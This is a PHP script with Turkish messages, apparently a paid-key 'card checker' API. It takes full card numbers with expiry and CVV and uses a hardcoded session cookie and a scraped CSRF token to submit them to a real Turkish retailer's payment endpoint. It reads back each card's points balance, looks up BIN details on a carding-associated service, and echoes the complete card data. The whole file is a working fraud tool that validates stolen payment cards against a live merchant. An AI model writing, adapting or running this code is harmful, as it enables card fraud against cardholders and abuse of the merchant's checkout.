<?php
header('Content-Type: text/plain; charset=utf-8');

function validateKey($key) {
    if (empty($key)) {
        return false;
    }
    
    $keysFile = '../users/bbbba.json';
    if (!file_exists($keysFile)) {
        return false;
    }
    
    $data = json_decode(file_get_contents($keysFile), true);
    if (!$data || !isset($data['keys'])) {
        return false;
    }
    
    foreach ($data['keys'] as $keyData) {
        if ($keyData['key'] === $key && $keyData['isActive']) {
            $expirationDate = new DateTime($keyData['expiresAt']);
            $currentDate = new DateTime();
            
            if ($currentDate <= $expirationDate) {
                return true;
            }
        }
    }
    
    return false;
}

$userKey = $_POST['key'] ?? $_GET['key'] ?? '';
if (!validateKey($userKey)) {
    http_response_code(403);
    die("❌ Geçersiz veya süresi dolmuş key! API erişimi reddedildi.");
}

function bin_sorgula(string $bin_kodu): string {
    $url = "https://bins.antipublic.cc/bins/{$bin_kodu}";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200 && $response) {
        $veri = json_decode($response, true);
        if ($veri) {
            $brand = $veri['brand'] ?? '';
            $country_name = $veri['country_name'] ?? '';
            $bank = $veri['bank'] ?? '';
            $level = $veri['level'] ?? '';
            $type = $veri['type'] ?? '';
            return "[{$brand}] [{$country_name}] [{$bank}] [{$level}] [{$type}]";
        }
    }
    return "BİLİNEMEDİ";
}

function puanDenetleme(string $kart): array {
    list($no, $ay, $yil, $cvv) = explode("|", $kart);

    $cookies = 'PHPSESSID=65phqrokeugsq87v4acurk4vl6';

    try {
        $ch = curl_init('https://www.happy.com.tr/index.php?route=checkout/confirm');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        $html = curl_exec($ch);
        if (!$html) throw new Exception("CSRF alınamadı.");

        $parts = explode('<input type="hidden" name="csrfToken" value="', $html);
        $csrfToken = explode('" />', $parts[1])[0];
        if (empty($csrfToken)) throw new Exception("CSRF parse edilemedi.");

        $bank_data = http_build_query([
            'bin' => substr($no, 0, 6),
            'bin8' => substr($no, 0, 8)
        ]);
        curl_setopt($ch, CURLOPT_URL, 'https://www.happy.com.tr/index.php?route=payment/creditcard/bank');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $bank_data);
        $bank_response = curl_exec($ch);
        if (!$bank_response) throw new Exception("Banka bilgisi alınamadı.");
        
        $bank = json_decode($bank_response, true);
        if (!isset($bank['bank_code'])) throw new Exception("Banka kodu alınamadı.");

        $checkpoint_data = http_build_query([
            'banka' => $bank["bank_code"],
            'cardtype' => '2',
            'cardname' => $bank["card_name"],
            'cc_cvv' => $cvv,
            'cc_number' => $no,
            'cc_month' => $ay,
            'cc_year' => '20' . substr($yil, -2),
            'useAmountInt' => '',
            'useAmountDecimal' => '',
            'csrfToken' => $csrfToken
        ]);
        curl_setopt($ch, CURLOPT_URL, 'https://www.happy.com.tr/index.php?route=payment/creditcard/checkPoint');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $checkpoint_data);
        $response_json = curl_exec($ch);
        curl_close($ch);

        $response_data = json_decode($response_json, true);

        if (isset($response_data['amount'])) {
            return [
                'durum' => true,
                'yanit' => $response_data["amount"],
                'code' => $bank["bank_code"],
                'name' => $bank["card_name"]
            ];
        } 
        elseif (isset($response_data['error'])) {
            return ['durum' => false, 'yanit' => $response_data["error"]];
        } 
        else {
            return ['durum' => false, 'yanit' => 'Bilinmeyen yanıt.'];
        }

    } catch (Exception $e) {
        if (isset($ch) && is_resource($ch)) {
            curl_close($ch);
        }
        return ['durum' => false, 'yanit' => $e->getMessage()];
    }
}

$kart = $_POST['card'] ?? $_GET['card'] ?? '';

if (empty($kart) || !str_contains($kart, '|')) {
    http_response_code(400);
    echo 'Hata: Kart bilgisi eksik ya da hatalı';
    exit;
}

$denetleme_sonucu = puanDenetleme($kart);
$bin_info = bin_sorgula(explode("|", $kart)[0]);

$outputText = "";

if ($denetleme_sonucu['durum']) {
    $outputText .= "Durum: ✅ Başarılı\n";
    $outputText .= "Kart: " . $kart . "\n";
    $outputText .= "Puan: " . $denetleme_sonucu['yanit'] . " TL\n";
    $outputText .= "Banka: " . strtoupper($denetleme_sonucu['name']) . "\n";
    $outputText .= "Kod: " . strtoupper($denetleme_sonucu['code']) . "\n";
    $outputText .= "BIN: " . $bin_info . "\n";
} else {
    $outputText .= "Durum: ❌ Başarısız\n";
    $outputText .= "Kart: " . $kart . "\n";
    $outputText .= "Mesaj: " . $denetleme_sonucu['yanit'] . "\n";
    $outputText .= "BIN: " . $bin_info . "\n";
}

echo $outputText;

?>